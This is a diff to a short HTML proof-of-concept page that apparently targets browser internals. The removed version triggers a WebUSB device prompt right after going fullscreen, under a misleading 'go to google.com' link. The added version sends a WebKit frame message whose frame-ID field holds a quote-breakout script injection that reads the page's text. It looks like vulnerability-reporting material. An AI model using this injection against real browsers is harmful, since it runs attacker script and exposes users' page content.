@@ -1,16 +1,16 @@
+<!DOCTYPE html>
 <html>
-	<body>
-	<script>
-function requestme() {
-	if (!navigator.usb) {
-		alert("please enable chrome://flags/#enable-experimental-web-platform-features");
-		return;
-	}
-	document.body.webkitRequestFullscreen();
-	setTimeout(function() {}, 0);
-	navigator.usb.requestDevice({filters: [{}]}).then(device => {console.log(device.productName);}).catch(error => { console.log(error); });
-}
-	</script>
-<a href='#' onclick="requestme()">go to google.com</a>
-	</body>
-	</html>
+ <body>
+ <script>
+ function createFrame() {
+	 window.webkit.messageHandlers.FrameBecameAvailable.postMessage({
+	 'crwFrameId': "foobar');alert(document['body']['innerText']+'",
+	 'crwFrameKey': '7tFIdTXkYWMsMvIlS31hnvvkxCppN0HUo8gmmChiT48=',
+	 'crwFrameLastReceivedMessageId': 0
+	 });
+ }
+ 
+ setTimeout(createFrame, 1000);
+ </script>
+ </body>
+</html>
